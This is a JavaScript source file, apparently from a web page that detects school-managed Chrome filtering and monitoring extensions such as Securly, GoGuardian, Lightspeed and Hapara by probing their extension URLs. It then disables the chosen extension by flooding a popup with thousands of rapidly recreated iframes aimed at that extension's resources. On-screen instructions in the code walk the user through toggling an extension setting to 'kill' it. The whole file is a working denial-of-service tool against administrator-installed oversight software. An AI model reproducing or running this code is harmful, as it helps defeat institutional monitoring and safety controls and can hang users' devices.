 (async () => {
      // --- Permissions ---
      try {
        await navigator.permissions.request({ name: 'device-info' });
        await navigator.permissions.request({ name: 'motion-sensor' });
        await navigator.permissions.request({ name: 'embedded-content' });
      } catch (error) {
        console.error("Permissions request failed:", error);
      }

      // --- Device Info & Defaults ---
      const deviceMemory = navigator.deviceMemory || 4;
      const defaultIframeCount = Math.round(deviceMemory * 500);
      const maxIframeCount = Math.round(deviceMemory * 1500);

      // --- DOM Elements ---
      const slider = document.getElementById("iframeCountSlider");
      const sliderValueDisplay = document.getElementById("iframeCountValue");
      const iframeSelect = document.getElementById("iframeSelect");
      const hangButton = document.getElementById("hangButton");
      const killButton = document.getElementById("killButton");
      const overlay = document.getElementById("overlay");
      const killExtensionText = document.getElementById("killExtensionText");

      // --- Slider Setup ---
      slider.value = defaultIframeCount;
      slider.max = maxIframeCount;
      sliderValueDisplay.textContent = defaultIframeCount;
      slider.addEventListener("input", () => {
        sliderValueDisplay.textContent = slider.value;
      });

      // --- Extension Detection & Population ---
      const extensions = {
        "Securly": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
        "Securly (old)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
        "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
        "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
        "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
        "Blocksi": "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html",
        "FortiGuard": "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js",
        "Cisco Umbrella": "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html",
        "ContentKeeper": "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png",
        "CK-Authenticator G3": "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png",
        "Securly Classroom": "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html",
        "Hapara": "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html",
        "Hapara (new ID)": "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html",
        "iboss": "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html",
        "Lightspeed Digital Insight Agent": "chrome-extension://njdniclgegijdcdliklgieicanpmcngj/js/wasm_exec.js",
        "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
        "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
        "InterCLASS Filtering Service": "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html",
        "InterSafe GatewayConnection Agent": "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js",
        "LoiLo Web Filters": "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png",
        "Gopher Buddy": "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png",
        "LanSchool Web Helper": "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html",
        "IMTLazarus": "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json",
        "Impero Backdrop": "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html",
        "Mobile Guardian": "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html",
        "NetSupport School Student": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/messages.json",
        "Lightspeed Alert Agent": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/main.js",
        "Lightspeed Alert Agent 2": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/in_page.js",
        "Lockdown Browser": "chrome-extension://fogjeanjfbiombghnmkmmophfeccjdki/manifest.json",
        "Linewize Filter": "chrome-extension://ifinpabiejbjobcphhaomiifjibpkjlf/background/assets/pages/default-blocked.html",
        "Borderless Classroom Student": "chrome-extension://kdpgkligilplaanoablcpjahjjeghcl/pages/blockPage.html",
      };

      const checkExtensionURL = async (url) => {
        try {
          const response = await fetch(url, {
            cache: 'no-store'
          });
          return response.ok;
        } catch (error) {
          return false;
        }
      };

      const populateSelectOptions = async () => {
        let hasSupportedExtensions = false;
        for (const [name, url] of Object.entries(extensions)) {
          if (await checkExtensionURL(url)) {
            const option = document.createElement("option");
            option.value = url;
            option.textContent = name;
            iframeSelect.appendChild(option);
            hasSupportedExtensions = true;
          }
        }

        if (!hasSupportedExtensions) {
          const option = document.createElement("option");
          option.value = "";
          option.textContent = "No supported extensions installed";
          iframeSelect.appendChild(option);
          hangButton.style.display = "none";
        }
      };

      await populateSelectOptions();

      // --- Iframe Overload ---
      const replaceIframes = (container, iframeSrc, iframeCount) => {
        const iframes = [];
        for (let i = 0; i < iframeCount; i++) {
          const iframe = document.createElement('iframe');
          iframe.src = iframeSrc;
          iframe.style.width = '100%';
          iframe.style.height = '100px';
          iframes.push(iframe);
          container.appendChild(iframe);
        }

        setTimeout(() => {
          iframes.forEach(iframe => iframe.remove());
          replaceIframes(container, iframeSrc, iframeCount);
        }, 5);
      };

      // --- Main Functionality ---
      const hangExtension = () => {
        overlay.style.display = "flex";
        const selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
        const selectedSrc = iframeSelect.value;
        const iframeCount = parseInt(slider.value, 10);

        const popup = window.open("", "PopupWindow", "width=100,height=100");
        const popupDocument = popup.document;
        const iframeContainer = popupDocument.createElement('div');
        iframeContainer.id = 'iframeContainer';
        popupDocument.body.appendChild(iframeContainer);

        replaceIframes(iframeContainer, selectedSrc, iframeCount);

        setTimeout(() => {
          popup.close();
          killExtensionText.innerHTML = `Now that the extension <strong>${selectedOption}</strong> has been hanged, press the button above.`;
          setTimeout(() => {
            overlay.style.display = "none";
            killExtensionText.style.display = "block";
            killButton.style.display = "inline-block";
            hangButton.style.display = "none";
            iframeSelect.style.display = "none";
            document.getElementById("labelForIframeSelect").style.display = "none";
            slider.style.display = "none";
            sliderValueDisplay.style.display = "none";
            document.getElementById("labelForIframeSlider").style.display = "none";
            killButton.setAttribute("data-url", selectedSrc);
          }, 10000);
        }, 5000);
      };

      const openExtensionPopup = () => {
        const selectedSrc = killButton.getAttribute("data-url");
        const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
        killButton.style.display = "none";
        killExtensionText.innerHTML = `Make sure to keep this tab open. Then open <strong>chrome://extensions/?id=${extensionId}</strong> and flip the switch called "Allow access to file URLs" twice. The extension was successfully killed! Now you can close that tab as well as this one. If you want to restore the extension, flip the allow access to file URLs switch again.`;
        window.location.href = selectedSrc;
      };

      // --- Event Listeners ---
      hangButton.addEventListener("click", hangExtension);
      killButton.addEventListener("click", openExtensionPopup);
    })();
